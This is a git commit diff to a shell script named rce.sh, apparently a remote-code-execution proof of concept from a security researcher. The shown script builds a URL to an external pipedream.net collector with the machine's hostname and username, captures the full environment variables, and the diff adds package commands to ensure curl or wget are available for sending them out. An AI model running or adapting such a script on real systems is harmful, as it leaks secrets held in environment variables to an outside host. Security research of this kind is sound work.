74f5d501e452c5eb048442e8384dae02e5b60856
Rotem Bar <rotem@cidersecurity.io>
2021-07-01 08:47:29 +0300

    Upgrade rce script

--- rce.sh
+++ rce.sh
@@ -5,8 +5,10 @@ echo "------------"
 URL="https://45916c134a9cdb740e1c9807952ed21d.m.pipedream.net/RCE/$1?host=$(hostname)&user=$(whoami)"
 ENV=$(env)
 
+# Install curl or wget
 apt-get update
 apt-get install -qq -y wget curl
+apk add curl wget -q
 
 echo "------------"
 echo "Printing ENV"
